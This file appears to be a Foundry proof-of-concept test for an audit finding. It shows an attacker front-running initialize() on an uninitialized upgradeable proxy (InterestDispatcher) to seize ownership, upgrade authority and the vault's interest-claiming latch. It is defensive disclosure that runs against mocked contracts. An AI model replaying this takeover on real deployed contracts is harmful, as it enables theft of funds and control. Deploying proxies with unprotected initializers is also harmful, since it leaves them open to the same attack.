// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SavingsEURe} from "src/SavingsEURe.sol";
import {InterestDispatcher} from "src/InterestDispatcher.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "openzeppelin/proxy/ERC1967/ERC1967Proxy.sol";
import {MockEURe} from "./Mocks/MockEURe.sol";

contract PoCInitRace is Test {
    address public deployer = address(1);
    address public attacker = address(0xBAD);

    InterestDispatcher public rcvImpl;
    InterestDispatcher public rcv;
    SavingsEURe public sEURe;
    IERC20 public eure = IERC20(0x420CA0f9B9b604cE0fd9C18EF134C705e5Fa3430);

    function setUp() public {
        MockEURe mockEure = new MockEURe();
        vm.etch(address(eure), address(mockEure).code);

        // Deployer deploys contracts (matching deploy script)
        vm.startPrank(deployer);
        rcvImpl = new InterestDispatcher();
        rcv = InterestDispatcher(address(new ERC1967Proxy(address(rcvImpl), "")));
        sEURe = new SavingsEURe(address(rcv));

        deal(address(eure), deployer, 1 ether);
        eure.approve(address(sEURe), 1 ether);
        sEURe.deposit(1 ether, deployer);
        vm.stopPrank();
    }

    function test_PoC_AttackerSeizesInitialization() public {
        // Pre-condition: receiver is uninitialized
        assertEq(address(rcv.sEURe()), address(0));
        assertEq(rcv.owner(), address(0));
        assertFalse(sEURe.interestClaimingEnabled());

        // Attacker funds receiver with enough EURe
        deal(address(eure), attacker, 200 ether);
        vm.prank(attacker);
        assertTrue(eure.transfer(address(rcv), 200 ether));

        // Attacker initializes, setting themselves as owner
        vm.prank(attacker);
        rcv.initialize(address(sEURe), attacker);

        // HARM: Attacker controls upgrade authority + vault latch
        assertEq(rcv.owner(), attacker);
        assertTrue(sEURe.interestClaimingEnabled());

        // Deployer cannot re-initialize
        vm.prank(deployer);
        vm.expectRevert(); // already initialized
        rcv.initialize(address(sEURe), deployer);
    }
}
